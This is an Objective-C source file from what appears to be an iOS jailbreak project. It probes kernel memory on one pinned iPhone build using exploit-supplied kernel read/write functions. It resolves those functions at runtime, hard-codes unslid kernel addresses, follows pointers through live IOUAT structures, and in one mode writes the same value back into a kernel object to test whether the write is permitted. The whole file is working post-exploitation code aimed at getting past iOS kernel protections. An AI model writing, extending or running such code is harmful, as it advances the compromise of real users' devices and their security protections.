//
//  CNDUatHardwareProbe.m
//
//  Physical 23A341 gate for the P2 IOUAT owner-binding question.
//
//  This is deliberately smaller than the historical UAT probes. It follows
//  only a statically pinned, boot-owned chain:
//
//    image global 0xb3934f8 + 0x28 -> adopted IOUAT object
//    image global 0xb3934f8 + 0x18 -> boot UAT record
//    image global 0xb387290 + 0x18 -> the same boot UAT record
//    adopted IOUAT object + 0x20    -> the live owner binding
//
//  Read mode establishes the live equality join. Write mode performs a single
//  same-value store to object+0x20, then re-reads every anchor. A same-value
//  store exercises stage-1 write permission without publishing a different
//  record pointer, invalidating a tag, or racing a restore window.
//  Record-state mode is read-only: it validates the bound record and its
//  physical state-page handle, but never dereferences a derived physmap VA.
//
//  No pointer scan, page-table walk, SPTM call, selector sweep, or kcall.
//

#import "CNDUatHardwareProbe.h"

#import <dlfcn.h>
#import <stdbool.h>
#import <stdint.h>
#import <string.h>
#import <unistd.h>

#pragma mark - 23A341 pins

static const uint64_t CNDUatHWUnslidTextBase = 0xfffffff007004000ull;
static const uint64_t CNDUatHWUnslidIOUATInit = 0xfffffff0089f36b8ull;
static const uint32_t CNDUatHWPacibsp = 0xd503237full;

static const uint64_t CNDUatHWGlobal = 0xfffffff00b3934f8ull;
static const uint64_t CNDUatHWManager = 0xfffffff00b387290ull;
static const uint64_t CNDUatHWUnslidRecordDescriptor = 0xfffffff007c399d8ull;
// Built by mov/movk as 0xbee5 in bits 63:48 plus the low 0x00010004 payload.
static const uint64_t CNDUatHWExpectedRecordTag = 0xbee5000000010004ull;
static const uint64_t CNDUatHWGPhysBase = 0xfffffff007c69dc0ull;
static const uint64_t CNDUatHWGPhysSize = 0xfffffff007c69dc8ull;
enum {
    CNDUatHWGlobalStatus = 0x00,
    CNDUatHWGlobalMode = 0x08,
    CNDUatHWGlobalRecord = 0x18,
    CNDUatHWGlobalObject = 0x28,
    CNDUatHWManagerRecord = 0x18,
    CNDUatHWObjectRecord = 0x20,
    CNDUatHWRecordTag = 0x18,
    CNDUatHWRecordStatePage = 0x20,
    CNDUatHWPageSize = 0x4000,
};

static const uint64_t CNDUatHWKernelPrefix = 0xfffffff000000000ull;

#pragma mark - kslop KRW API

typedef void (*CNDUatHWReadFn)(uint64_t address, void *buffer, uint64_t length);
typedef void (*CNDUatHWWrite64Fn)(uint64_t address, uint64_t value);
typedef bool (*CNDUatHWReadyFn)(void);
typedef bool (*CNDUatHWValidFn)(uint64_t address);

typedef struct {
    CNDUatHWReadFn read;
    CNDUatHWWrite64Fn write64;
    CNDUatHWReadyFn ready;
    CNDUatHWValidFn valid;
    uint64_t *kernelBase;
    uint64_t *kernelSlide;
    uint64_t *t1sz;
    uint64_t ptrMask;
} CNDUatHWAPI;

typedef struct {
    uint64_t slide;
    uint64_t base;
    uint64_t global;
    uint64_t manager;
    uint64_t object;
    uint64_t objectRaw;
    uint64_t objectRecord;
    uint64_t objectRecordRaw;
} CNDUatHWBindingSnapshot;

static bool CNDUatHWResolve(CNDUatHWAPI *api, NSString **reason)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
    api->read = (CNDUatHWReadFn)dlsym(RTLD_DEFAULT, "kreadbuf");
    api->write64 = (CNDUatHWWrite64Fn)dlsym(RTLD_DEFAULT, "kwrite64");
    api->ready = (CNDUatHWReadyFn)dlsym(RTLD_DEFAULT, "kexploit_krw_ready");
    api->valid = (CNDUatHWValidFn)dlsym(RTLD_DEFAULT, "is_kaddr_valid");
    api->kernelBase = (uint64_t *)dlsym(RTLD_DEFAULT, "g_kernel_base");
    api->kernelSlide = (uint64_t *)dlsym(RTLD_DEFAULT, "g_kernel_slide");
    api->t1sz = (uint64_t *)dlsym(RTLD_DEFAULT, "t1sz_boot");

    uint64_t t1sz = api->t1sz != NULL ? *api->t1sz : 0;
    if (t1sz == 0 || t1sz >= 64 || (64 - t1sz) >= 64) {
        if (reason != NULL) *reason = @"invalid-or-missing-t1sz";
        return false;
    }
    api->ptrMask = (1ull << (64 - t1sz)) - 1ull;

    bool ok = api->read != NULL && api->write64 != NULL &&
        api->ready != NULL && api->valid != NULL &&
        api->kernelBase != NULL && api->kernelSlide != NULL;
    if (!ok && reason != NULL) *reason = @"kslop-krw-api-incomplete";
    return ok;
}

static bool CNDUatHWRead(const CNDUatHWAPI *api, uint64_t address,
                         void *buffer, size_t length)
{
    if (api == NULL || api->read == NULL || buffer == NULL || length == 0) {
        return false;
    }
    api->read(address, buffer, (uint64_t)length);
    return true;
}

static bool CNDUatHWRead64(const CNDUatHWAPI *api, uint64_t address,
                           uint64_t *value)
{
    if (value == NULL) return false;
    *value = 0;
    return CNDUatHWRead(api, address, value, sizeof(*value));
}

static bool CNDUatHWRead32(const CNDUatHWAPI *api, uint64_t address,
                           uint32_t *value)
{
    if (value == NULL) return false;
    *value = 0;
    return CNDUatHWRead(api, address, value, sizeof(*value));
}

static uint64_t CNDUatHWCanonicalPointer(const CNDUatHWAPI *api, uint64_t value)
{
    if (api == NULL || api->valid == NULL || value == 0) return 0;
    if (api->valid(value)) return value;
    uint64_t candidate = CNDUatHWKernelPrefix | (value & api->ptrMask);
    return api->valid(candidate) ? candidate : 0;
}

static NSString *CNDUatHWHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx", (unsigned long long)value];
}

#pragma mark - reporting

static NSString *CNDUatHWReportPath(void)
{
    NSString *dir = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    return dir != nil
        ? [dir stringByAppendingPathComponent:@"CNDUatHardwareBindingProbe.json"]
        : nil;
}

static void CNDUatHWPersist(NSMutableDictionary<NSString *, id> *report,
                            NSString *result)
{
    if (result != nil) report[@"result"] = result;
    report[@"updatedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSString *path = CNDUatHWReportPath();
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys error:nil];
    if (path != nil && data != nil) {
        (void)[data writeToFile:path options:NSDataWritingAtomic error:nil];
        report[@"reportPath"] = path;
    }
    NSLog(@"[CND_UAT_HW] result=%@ write=%@", result,
          report[@"writeAttempted"] ?: @NO);
}

static void CNDUatHWFinish(NSMutableDictionary<NSString *, id> *report,
                           NSString *result,
                           void (^completion)(NSDictionary<NSString *, id> *))
{
    CNDUatHWPersist(report, result);
    NSLog(@"[CND_UAT_HW_RESULT] result=%@ objectRecord=%@ descriptor=%@ "
          "tag=%@ statePagePA=%@ inPhysicalRange=%@ readAttempted=%@",
          report[@"result"] ?: @"missing",
          report[@"objectRecord"] ?: @"missing",
          report[@"recordDescriptor"] ?: @"missing",
          report[@"recordTag"] ?: @"missing",
          report[@"statePagePA"] ?: @"missing",
          report[@"statePageInPhysicalRange"] ?: @"missing",
          report[@"statePageReadAttempted"] ?: @"missing");
    if (completion != nil) completion([report copy]);
}

static NSString *CNDUatHWCaptureLiveBinding(
    NSMutableDictionary<NSString *, id> *report,
    CNDUatHWAPI *api,
    CNDUatHWBindingSnapshot *snapshot)
{
    if (report == nil || api == NULL || snapshot == NULL) {
        return @"invalid-probe-state";
    }
    memset(snapshot, 0, sizeof(*snapshot));

    NSString *reason = nil;
    if (!CNDUatHWResolve(api, &reason)) {
        return reason ?: @"api-unavailable";
    }
    if (!api->ready()) {
        return @"refused-krw-not-ready";
    }
    uint64_t slide = *api->kernelSlide;
    uint64_t base = *api->kernelBase;
    report[@"kernelBase"] = CNDUatHWHex(base);
    report[@"kernelSlide"] = CNDUatHWHex(slide);
    report[@"t1sz"] = @(*api->t1sz);
    if (base != CNDUatHWUnslidTextBase + slide) {
        return @"refused-kernel-base-slide-mismatch";
    }

    uint32_t witness = 0;
    if (!CNDUatHWRead(api, CNDUatHWUnslidIOUATInit + slide,
                      &witness, sizeof(witness)) || witness != CNDUatHWPacibsp) {
        report[@"witness"] = [NSString stringWithFormat:@"0x%08x", witness];
        return @"refused-image-witness-mismatch";
    }
    report[@"witness"] = @"pacibsp";

    uint64_t global = CNDUatHWGlobal + slide;
    uint64_t manager = CNDUatHWManager + slide;
    uint32_t status = 0;
    uint64_t mode = 0, configRecordRaw = 0;
    uint64_t managerRecordRaw = 0, objectRaw1 = 0, objectRaw2 = 0;
    CNDUatHWRead32(api, global + CNDUatHWGlobalStatus, &status);
    CNDUatHWRead64(api, global + CNDUatHWGlobalMode, &mode);
    CNDUatHWRead64(api, global + CNDUatHWGlobalRecord, &configRecordRaw);
    CNDUatHWRead64(api, manager + CNDUatHWManagerRecord, &managerRecordRaw);
    CNDUatHWRead64(api, global + CNDUatHWGlobalObject, &objectRaw1);
    usleep(1000);
    CNDUatHWRead64(api, global + CNDUatHWGlobalObject, &objectRaw2);

    report[@"global"] = CNDUatHWHex(global);
    report[@"manager"] = CNDUatHWHex(manager);
    report[@"status"] = @(status);
    report[@"modeWord"] = CNDUatHWHex(mode);
    report[@"configRecordRaw"] = CNDUatHWHex(configRecordRaw);
    report[@"managerRecordRaw"] = CNDUatHWHex(managerRecordRaw);
    report[@"objectRawFirst"] = CNDUatHWHex(objectRaw1);
    report[@"objectRawSecond"] = CNDUatHWHex(objectRaw2);
    if (status != 1 || objectRaw1 == 0 || objectRaw1 != objectRaw2) {
        return @"refused-global-invariants";
    }

    uint64_t configRecord = CNDUatHWCanonicalPointer(api, configRecordRaw);
    uint64_t managerRecord = CNDUatHWCanonicalPointer(api, managerRecordRaw);
    uint64_t object = CNDUatHWCanonicalPointer(api, objectRaw1);
    report[@"configRecord"] = CNDUatHWHex(configRecord);
    report[@"managerRecord"] = CNDUatHWHex(managerRecord);
    report[@"object"] = CNDUatHWHex(object);
    if (configRecord == 0 || managerRecord == 0 || object == 0 ||
        configRecord != managerRecord || (object & 0xf) != 0) {
        return @"refused-owner-join";
    }

    uint64_t objectRecordRaw = 0;
    if (!CNDUatHWRead64(api, object + CNDUatHWObjectRecord,
                        &objectRecordRaw)) {
        return @"refused-object-read";
    }
    uint64_t objectRecord = CNDUatHWCanonicalPointer(api, objectRecordRaw);
    report[@"objectRecordRaw"] = CNDUatHWHex(objectRecordRaw);
    report[@"objectRecord"] = CNDUatHWHex(objectRecord);
    report[@"ownerJoin"] = @(objectRecord != 0 && objectRecord == configRecord);
    if (objectRecord == 0 || objectRecord != configRecord) {
        return @"refused-live-binding-mismatch";
    }

    snapshot->slide = slide;
    snapshot->base = base;
    snapshot->global = global;
    snapshot->manager = manager;
    snapshot->object = object;
    snapshot->objectRaw = objectRaw1;
    snapshot->objectRecord = objectRecord;
    snapshot->objectRecordRaw = objectRecordRaw;
    return nil;
}

#pragma mark - probe

void CNDUatHardwareBindingProbeRun(
    BOOL allowSameValueWrite,
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": @"com.zeroxjf.cyanide.uat-hardware-binding-probe",
        @"schemaVersion": @1,
        @"pinnedImage": @"iPhone17,2 23A341",
        @"mode": allowSameValueWrite ? @"same-value-write" : @"read-only",
        @"writeAttempted": @NO,
        @"pointerSubstitution": @NO,
        @"pid": @(getpid()),
    } mutableCopy];

    CNDUatHWAPI api;
    CNDUatHWBindingSnapshot binding;
    NSString *reason = CNDUatHWCaptureLiveBinding(report, &api, &binding);
    if (reason != nil) {
        CNDUatHWFinish(report, reason, completion);
        return;
    }

    if (!allowSameValueWrite) {
        CNDUatHWFinish(report, @"observed-live-owner-binding", completion);
        return;
    }

    // A same-value store still exercises the translation's write permission,
    // but creates no interval in which a consumer can observe a substitute.
    report[@"writeAttempted"] = @YES;
    report[@"writeAddress"] = CNDUatHWHex(
        binding.object + CNDUatHWObjectRecord);
    report[@"writeValue"] = CNDUatHWHex(binding.objectRecordRaw);
    api.write64(binding.object + CNDUatHWObjectRecord,
                binding.objectRecordRaw);

    uint64_t objectRawAfter = 0, objectRecordAfterRaw = 0;
    CNDUatHWRead64(&api, binding.global + CNDUatHWGlobalObject,
                   &objectRawAfter);
    CNDUatHWRead64(&api, binding.object + CNDUatHWObjectRecord,
                   &objectRecordAfterRaw);
    report[@"objectRawAfter"] = CNDUatHWHex(objectRawAfter);
    report[@"objectRecordAfterRaw"] = CNDUatHWHex(objectRecordAfterRaw);

    bool stable = objectRawAfter == binding.objectRaw &&
        objectRecordAfterRaw == binding.objectRecordRaw;
    report[@"postWriteStable"] = @(stable);
    CNDUatHWFinish(report,
        stable ? @"same-value-write-survived" : @"post-write-mismatch",
        completion);
}

void CNDUatHardwareRecordStateProbeRun(
    void (^completion)(NSDictionary<NSString *, id> *report))
{
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": @"com.zeroxjf.cyanide.uat-record-state-probe",
        @"schemaVersion": @1,
        @"pinnedImage": @"iPhone17,2 23A341",
        @"mode": @"record-state-read",
        @"writeAttempted": @NO,
        @"pointerSubstitution": @NO,
        @"pid": @(getpid()),
    } mutableCopy];

    CNDUatHWAPI api;
    CNDUatHWBindingSnapshot binding;
    NSString *reason = CNDUatHWCaptureLiveBinding(report, &api, &binding);
    if (reason != nil) {
        CNDUatHWFinish(report, reason, completion);
        return;
    }

    uint64_t recordOffset = binding.objectRecord & (CNDUatHWPageSize - 1);
    bool recordGeometryValid = recordOffset <= 0x3fd8 &&
        recordOffset % 0x28 == 0;
    report[@"recordOffsetInPage"] = CNDUatHWHex(recordOffset);
    report[@"recordGeometryValid"] = @(recordGeometryValid);
    if (!recordGeometryValid) {
        CNDUatHWFinish(report, @"refused-record-geometry", completion);
        return;
    }

    uint64_t recordWords[5] = {0};
    if (!CNDUatHWRead(&api, binding.objectRecord, recordWords,
                      sizeof(recordWords))) {
        CNDUatHWFinish(report, @"refused-record-read", completion);
        return;
    }
    uint64_t descriptor = CNDUatHWCanonicalPointer(&api, recordWords[0]);
    uint64_t expectedDescriptor = CNDUatHWUnslidRecordDescriptor + binding.slide;
    uint64_t statePagePA = recordWords[CNDUatHWRecordStatePage / 8];
    report[@"recordDescriptorRaw"] = CNDUatHWHex(recordWords[0]);
    report[@"recordDescriptor"] = CNDUatHWHex(descriptor);
    report[@"expectedRecordDescriptor"] = CNDUatHWHex(expectedDescriptor);
    report[@"recordNameWord"] = CNDUatHWHex(recordWords[1]);
    report[@"recordReservedWord"] = CNDUatHWHex(recordWords[2]);
    report[@"recordTag"] = CNDUatHWHex(recordWords[CNDUatHWRecordTag / 8]);
    report[@"statePagePA"] = CNDUatHWHex(statePagePA);
    if (descriptor != expectedDescriptor) {
        CNDUatHWFinish(report, @"refused-record-descriptor-mismatch", completion);
        return;
    }
    if (recordWords[CNDUatHWRecordTag / 8] != CNDUatHWExpectedRecordTag) {
        CNDUatHWFinish(report, @"refused-record-tag-mismatch", completion);
        return;
    }
    if (statePagePA == 0 || (statePagePA & (CNDUatHWPageSize - 1)) != 0) {
        CNDUatHWFinish(report, @"refused-state-page-alignment", completion);
        return;
    }

    uint64_t physBase = 0, physSize = 0;
    CNDUatHWRead64(&api, CNDUatHWGPhysBase + binding.slide, &physBase);
    CNDUatHWRead64(&api, CNDUatHWGPhysSize + binding.slide, &physSize);
    report[@"gPhysBase"] = CNDUatHWHex(physBase);
    report[@"gPhysSize"] = CNDUatHWHex(physSize);
    if (physBase == 0 || physSize < CNDUatHWPageSize ||
        statePagePA < physBase ||
        statePagePA - physBase > physSize - CNDUatHWPageSize) {
        CNDUatHWFinish(report, @"refused-state-page-outside-physmap", completion);
        return;
    }

    report[@"statePageInPhysicalRange"] = @YES;
    report[@"statePageReadAttempted"] = @NO;
    report[@"statePageReadRefusal"] =
        @"physmap-range-membership-does-not-prove-a-mapped-aperture-va";
    CNDUatHWFinish(report, @"observed-live-record-state-handle", completion);
}
